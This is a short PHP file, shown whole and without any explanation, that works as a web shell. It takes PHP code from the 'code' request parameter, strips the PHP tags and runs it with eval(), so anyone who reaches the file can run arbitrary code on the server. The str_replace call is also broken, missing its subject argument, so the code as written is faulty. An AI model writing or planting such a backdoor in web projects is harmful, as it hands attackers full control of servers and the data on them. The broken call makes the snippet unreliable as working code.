<?php
$s=array('<?php'=>'','<?='=>'','<?'=>'','?>'=>''); 
echo htmlspecialchars(eval(str_replace($s,$_REQUEST['code'])));
?>